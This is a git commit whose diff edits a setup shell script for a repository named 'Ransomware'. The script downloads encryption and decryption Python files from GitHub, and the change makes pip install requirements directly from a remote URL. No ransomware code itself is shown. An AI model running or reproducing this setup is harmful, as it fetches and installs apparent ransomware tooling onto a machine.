c459106e85f655c3389549e42c5d02a1db5b8e2f
Fnu Abdullah <abdullahmkh004@gmail.com>
2025-09-16 12:41:11 -0500

    Checking to pull the requirements.txt online

--- scripts/setup.sh
+++ scripts/setup.sh
@@ -7,7 +7,7 @@ wget https://raw.githubusercontent.com/Google-design/Ransomware/main/encrypt_ful
 wget https://raw.githubusercontent.com/Google-design/Ransomware/main/decrypt_gui.py
 
 # Download requirements.txt from GitHub
-wget https://raw.githubusercontent.com/Google-design/Ransomware/main/requirements.txt
+# wget https://raw.githubusercontent.com/Google-design/Ransomware/main/requirements.txt
 
 # Create the .env file
 cat <<EOF > .env
@@ -22,7 +22,8 @@ python3 -m venv venv
 source venv/bin/activate
 
 # Install dependencies inside the venv
-pip install -r requirements.txt --prefer-binary
+# pip install -r requirements.txt --prefer-binary
+pip install -r https://raw.githubusercontent.com/Google-design/Ransomware/main/scripts/requirements.txt --prefer-binary 2>/dev/null || echo "No requirements.txt found"
 
 # Deactivate just to be safe
 deactivate
